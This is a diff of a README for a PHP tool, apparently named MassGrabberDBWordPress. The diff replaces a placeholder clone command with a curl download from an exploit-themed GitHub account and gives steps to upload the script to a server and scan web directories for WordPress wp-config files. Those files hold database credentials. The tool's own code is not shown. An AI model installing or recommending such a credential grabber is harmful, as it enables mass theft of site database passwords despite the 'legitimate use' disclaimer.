@@ -23,20 +23,20 @@ This tool is intended for **legitimate administrative purposes only**. You must 
 - Read access to target directories
 
 ### Installation Steps:
-1. Clone or download this repository:
+1. Clone or download this file tools:
    ```bash
-   git clone https://github.com/yourusername/db-config-grabber.git
+   curl -O https://raw.githubusercontent.com/JawaTengahXploit1337/MassGrabberDBWordPress/main/GrabDB.php
    ```
-2. Upload `grabber.php` to your server
+2. Upload `GrabDB..php` to your server
 3. Set appropriate permissions:
    ```bash
-   chmod 644 grabber.php
+   chmod 644 GrabDB..php
    ```
 
 ## 🚀 **Usage**
 1. Access the tool via browser:
    ```
-   https://yourserver.com/path/to/grabber.php
+   https://yourserver.com/path/to/GrabDB.php
    ```
 2. Enter the directory path you want to scan (e.g., `/var/www/html/`)
 3. Click "Scan for WP-Config"
